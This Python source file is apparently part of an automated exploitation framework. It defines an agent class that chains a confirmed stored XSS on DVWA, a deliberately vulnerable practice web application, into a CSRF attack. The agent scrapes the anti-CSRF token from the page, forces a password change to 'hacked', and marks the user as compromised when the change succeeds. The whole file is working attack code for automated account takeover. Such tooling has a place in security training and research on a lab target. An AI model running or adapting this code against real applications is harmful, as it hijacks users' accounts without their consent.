"""Tier 3 chain agent: stored XSS -> CSRF compromise."""

from __future__ import annotations

from typing import Any
import re

from agents.base_agent import BaseAgent
from agents.state_utils import make_update
from core.state import ExploitationState
from foundation.session_manager import DVWASession


class XSSToCSRFChainAgent(BaseAgent):
    module_name = "xss_s"

    def check_prerequisites(self, state: ExploitationState) -> bool:
        return "xss_stored_confirmed" in set(state.get("confirmed_vulns", []))

    def run(self, state: ExploitationState) -> dict[str, Any]:
        tried_now = ["chain:xss_to_csrf"]
        score = 0
        confirmed: list[str] = []
        outcomes: list[str] = []

        if not self.check_prerequisites(state):
            return make_update(
                state=state,
                module_name=self.module_name,
                score=score,
                tried_payloads=tried_now,
            )

        target_url = state.get("target_url", "")
        if not target_url:
            return make_update(
                state=state,
                module_name=self.module_name,
                score=score,
                tried_payloads=tried_now,
            )

        session = DVWASession(target_url)
        try:
            endpoint = "/vulnerabilities/csrf/"
            page = session.get(endpoint)
            page_body = page.text or ""
            token_match = re.search(r'name=["\']user_token["\']\s+value=["\']([^"\']+)', page_body)

            params = {
                "password_new": "hacked",
                "password_conf": "hacked",
                "Change": "Change",
            }
            if token_match:
                params["user_token"] = token_match.group(1)
                tried_now.append("csrf_with_token")
            else:
                tried_now.append("csrf_without_token")
                return make_update(
                    state=state,
                    module_name=self.module_name,
                    score=score,
                    tried_payloads=tried_now,
                )

            result = session.get(endpoint, params=params)
            result_body = (result.text or "").lower()
            if "password changed" in result_body:
                score = 4
                confirmed = ["csrf_confirmed", "user_compromised"]
                outcomes = ["user_compromised"]
        except Exception:
            pass
        finally:
            session.close()

        return make_update(
            state=state,
            module_name=self.module_name,
            score=score,
            tried_payloads=tried_now,
            confirmed_vulns=confirmed,
            achieved_outcomes=outcomes,
        )


_AGENT = XSSToCSRFChainAgent()


def xss_to_csrf_chain(state: ExploitationState) -> dict[str, Any]:
    return _AGENT.run(state)
